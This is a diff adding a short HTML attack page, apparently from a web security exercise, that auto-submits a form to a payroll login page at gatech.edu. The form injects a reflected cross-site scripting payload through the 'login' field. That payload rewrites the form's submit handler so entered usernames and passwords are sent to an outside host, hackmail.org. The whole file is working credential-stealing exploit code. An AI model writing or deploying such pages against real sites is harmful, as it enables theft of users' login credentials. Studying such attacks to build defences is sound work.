@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<!-- The attacker is able to inject malicious javascript in the login input value from index.php since there is really no input validation. -->
+<body onload='document.forms[0].submit()'>
+<form action='http://payroll.gatech.edu/index.php' onsubmit='' method='POST'>
+<input type='hidden' name='login' value='"/><script>function attack(){return $.ajax({async: false, type:"GET", url:"http://hackmail.org/sendmail.php?" + "&username=haxor" + "&payload=" + document.getElementsByName("login")[0].value + " " + document.getElementsByName("pw")[0].value + "&random=" + Math.random()});}; document.forms[0].setAttribute("onsubmit", "return attack();");</script><br'/>
+</form>
+</body>
+</html>
